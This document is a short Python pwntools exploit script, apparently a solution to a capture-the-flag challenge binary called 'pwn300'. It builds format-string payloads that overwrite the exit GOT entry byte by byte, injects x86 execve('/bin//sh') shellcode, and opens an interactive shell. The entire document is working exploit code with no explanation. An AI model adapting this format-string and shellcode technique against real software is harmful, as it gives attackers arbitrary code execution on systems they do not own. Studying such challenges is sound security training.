from pwn import *
import time,sys,binascii

elf_name = "./pwn300"
elf = ELF(elf_name)
libc = ELF('/lib32/libc.so.6')

io = process( elf_name )
#gdb.attach(io, "b *0x080486A2")

exit_got = 0x08049120
shellcode_addr = 0x08049180

shellcode = "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f" \
                "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0" \
                "\x0b\xcd\x80"

def leave_message(message):
    io.recvuntil('input your choice:\n')
    io.sendline(str(2))
    io.recvuntil('input your message\n')
    io.sendline(message)

def print_message():
    io.recvuntil('input your choice:\n')
    io.sendline(str(3))
    io.recvuntil('Your message is:')


def main():
    payload1 = p32(exit_got) + '%%%dc' % ((shellcode_addr & 0xff) - 4) + '%7$hhn'
    payload2 = p32(exit_got+1) + '%%%dc' % ((shellcode_addr>>8 & 0xff) - 4) + '%7$hhn'

    leave_message(payload1)
    print_message()

    leave_message(payload2)
    print_message()

    leave_message(shellcode)
    print_message()

    io.recvuntil('input your choice:\n')
    io.sendline(str(4))

    io.interactive()

if __name__ == '__main__':
    main()
